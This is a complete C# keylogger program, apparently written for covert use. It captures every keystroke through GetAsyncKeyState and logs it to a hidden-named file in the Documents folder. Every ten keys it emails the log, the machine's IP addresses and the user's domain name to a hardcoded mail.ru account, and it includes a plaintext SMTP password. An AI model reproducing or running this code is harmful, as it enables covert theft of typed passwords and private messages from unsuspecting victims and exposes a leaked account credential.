using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using System.Text;
using System.Runtime.InteropServices;
using System.Threading;
using System.IO;
using System.Net;
using System.Net.Mail;

namespace Keylogger
{
    class Program
    {
        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        static int number = 0;

        static void Main(string[] args)
        {
            String filepath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            if (!Directory.Exists(filepath))
            {
                Directory.CreateDirectory(filepath);
            }

            String path = (filepath + @"\klprjct.txt");
            if (!File.Exists(path))
            {
                using (StreamWriter sw = File.CreateText(path)) ;
            }

            while (true)
            {
                Thread.Sleep(10);

                for (int i = 32; i < 127; i++)
                {
                    int KeyState = GetAsyncKeyState(i);


                    if (KeyState == 32769)
                    {
                        Console.Write((char)i + " ");

                        using (StreamWriter sw = File.AppendText(path))
                        {
                            sw.Write((char)i);

                        }
                        number++;

                        if ((number % 10) == 0)
                        {
                            SendNewMessage();
                        }
                    }
                }

            }

        }



        static void SendNewMessage()
        {
            String folderName = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            string filePath = folderName + @"\klprjct.txt";

            String topic = File.ReadAllText(filePath);

            DateTime now = DateTime.Now;
            string body = "";
            string Subject = "Keylogger";



            var host = Dns.GetHostEntry(Dns.GetHostName());

            foreach (var address in host.AddressList)
            {
                body += "address:" + address;
            }

            body += "\n User:" + Environment.UserDomainName;
            body += "\nhost:" + host;
            body += "\ntime:" + now.ToString();
            body += topic;

            SmtpClient client = new SmtpClient("smtp.mail.ru", 587);
            MailMessage mailmessage = new MailMessage();

            mailmessage.From = new MailAddress("anncheprjctx@mail.ru");

            mailmessage.To.Add("anncheprjctx@mail.ru");

            mailmessage.Subject = Subject;


            client.UseDefaultCredentials = false;
            client.EnableSsl = true;
            client.Credentials = new System.Net.NetworkCredential("anncheprjctx@mail.ru", "6hpW-b3Qd-dG),W");
            mailmessage.Body = body;

            client.Send(mailmessage);





        }
    }
}
